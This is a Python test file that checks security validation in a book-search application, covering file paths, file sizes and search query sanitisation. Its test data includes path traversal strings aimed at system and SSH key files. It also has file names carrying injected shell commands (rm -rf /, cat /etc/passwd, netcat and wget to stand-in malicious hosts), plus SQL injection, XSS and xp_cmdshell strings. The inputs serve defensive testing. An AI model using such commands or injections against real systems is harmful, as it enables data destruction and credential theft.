"""
Test security fixes and improvements
"""

import pytest
import tempfile
from pathlib import Path
from unittest.mock import patch
import sys
from pydantic import ValidationError

# Add src to path for imports
sys.path.append(str(Path(__file__).parent.parent.parent / "src"))

from src.core.models import Book, FileType
from src.search.text_search import TextSearchEngine


class TestSecurityFixes:
    """Test that security vulnerabilities have been fixed"""
    
    def test_file_path_validation_prevents_traversal(self):
        """Test that file path validation prevents directory traversal"""
        # Test legitimate paths (should work)
        with tempfile.NamedTemporaryFile(suffix='.pdf', dir='/tmp', delete=False) as tmp_file:
            legitimate_path = tmp_file.name
            
        try:
            book = Book(
                id="test_legitimate",
                title="Test Book",
                file_path=legitimate_path,
                file_type=FileType.PDF
            )
            # Should not raise exception for legitimate path
            assert book.file_path == legitimate_path
        finally:
            Path(legitimate_path).unlink(missing_ok=True)
    
    def test_file_path_validation_blocks_traversal_attacks(self):
        """Test that path traversal attacks are blocked"""
        # Test paths with suspicious characters
        suspicious_paths = [
            "../../../etc/passwd",
            "../../home/user/.ssh/id_rsa", 
            "~/../../etc/hosts",
            "data/../../../secret.txt"
        ]
        
        for malicious_path in suspicious_paths:
            with pytest.raises(ValidationError, match="suspicious characters"):
                Book(
                    id="test_malicious",
                    title="Malicious Book",
                    file_path=malicious_path,
                    file_type=FileType.PDF
                )
        
        # Test absolute paths outside allowed directories
        outside_paths = [
            "/etc/shadow",
            "/home/user/secret.txt",
            "/var/log/system.log"
        ]
        
        for malicious_path in outside_paths:
            with pytest.raises(ValidationError, match="outside allowed directories"):
                Book(
                    id="test_malicious",
                    title="Malicious Book",
                    file_path=malicious_path,
                    file_type=FileType.PDF
                )
    
    def test_file_path_validation_blocks_suspicious_patterns(self):
        """Test that suspicious patterns in paths are blocked"""
        suspicious_paths = [
            "/tmp/file`rm -rf /`.pdf",
            "/tmp/file;cat /etc/passwd.pdf",
            "/tmp/file|netcat evil.com.pdf",
            "/tmp/file&wget malware.com.pdf"
        ]
        
        for suspicious_path in suspicious_paths:
            with pytest.raises(ValidationError, match="suspicious characters"):
                Book(
                    id="test_suspicious",
                    title="Suspicious Book", 
                    file_path=suspicious_path,
                    file_type=FileType.PDF
                )
    
    def test_file_size_limits_enforced(self):
        """Test that file size limits are enforced"""
        # Create a temporary file and mock the stat call to show it as large
        with tempfile.NamedTemporaryFile(suffix='.pdf', dir='/tmp', delete=False) as tmp_file:
            tmp_file.write(b"PDF content")
            temp_path = tmp_file.name
            
        try:
            # Mock just the stat().st_size to show file as too large
            with patch('pathlib.Path.stat') as mock_stat:
                # Create a mock stat object
                class MockStat:
                    st_size = 600 * 1024 * 1024  # 600MB
                    st_mode = 0o100644  # Regular file mode
                
                mock_stat.return_value = MockStat()
                
                with pytest.raises(ValidationError, match="File too large"):
                    Book(
                        id="test_large",
                        title="Large Book",
                        file_path=temp_path,
                        file_type=FileType.PDF
                    )
        finally:
            Path(temp_path).unlink(missing_ok=True)
    
    def test_search_query_sanitization(self):
        """Test that search queries are properly sanitized"""
        engine = TextSearchEngine()
        
        # Test SQL injection attempts
        malicious_queries = [
            "'; DROP TABLE chunks; --",
            "test UNION SELECT * FROM chunks",
            "test; DELETE FROM books;",
            "<script>alert('xss')</script>",
            "exec xp_cmdshell 'dir'"
        ]
        
        for malicious_query in malicious_queries:
            with pytest.raises(ValueError, match="potentially dangerous pattern"):
                engine._sanitize_search_query(malicious_query)
    
    def test_search_query_length_limits(self):
        """Test that overly long queries are rejected"""
        engine = TextSearchEngine()
        
        # Test query that's too long
        long_query = "a" * 1001
        with pytest.raises(ValueError, match="Query too long"):
            engine._sanitize_search_query(long_query)
    
    def test_search_query_term_limits(self):
        """Test that queries with too many terms are rejected"""
        engine = TextSearchEngine()
        
        # Test query with too many terms
        too_many_terms = " ".join(["term"] * 51)
        with pytest.raises(ValueError, match="too many terms"):
            engine._sanitize_search_query(too_many_terms)
    
    def test_search_query_special_character_limits(self):
        """Test that queries with too many special characters are rejected"""
        engine = TextSearchEngine()
        
        # Test query with excessive special characters (avoiding dangerous patterns)
        special_chars_query = "!@#$%^&*()_+{}:<>?[]\\'\",./~`"
        with pytest.raises(ValueError, match="too many special characters"):
            engine._sanitize_search_query(special_chars_query)
    
    def test_legitimate_search_queries_pass(self):
        """Test that legitimate search queries pass validation"""
        engine = TextSearchEngine()
        
        legitimate_queries = [
            "moving average strategy",
            "\"exact phrase search\"",
            "trading AND strategies",
            "python code",
            "RSI indicator",
            "machine learning finance"
        ]
        
        for query in legitimate_queries:
            # Should not raise exception
            sanitized = engine._sanitize_search_query(query)
            assert len(sanitized) > 0


class TestResourceManagement:
    """Test improved resource management"""
    
    @pytest.mark.asyncio
    async def test_embedding_generator_context_manager(self):
        """Test that embedding generator can be used as context manager"""
        from ingestion.local_embeddings import LocalEmbeddingGenerator
        
        with patch('ingestion.local_embeddings.httpx.AsyncClient'):
            async with LocalEmbeddingGenerator() as generator:
                assert generator is not None
                assert hasattr(generator, 'cleanup')


class TestErrorHandling:
    """Test improved error handling"""
    
    def test_invalid_input_types_handled(self):
        """Test that invalid input types are handled gracefully"""
        engine = TextSearchEngine()
        
        # Test non-string input
        with pytest.raises(ValueError, match="Query must be a string"):
            engine._sanitize_search_query(123)
        
        with pytest.raises(ValueError, match="Query must be a string"):
            engine._sanitize_search_query(None)
        
        with pytest.raises(ValueError, match="Query must be a string"):
            engine._sanitize_search_query(['list', 'of', 'words'])


if __name__ == "__main__":
    pytest.main([__file__])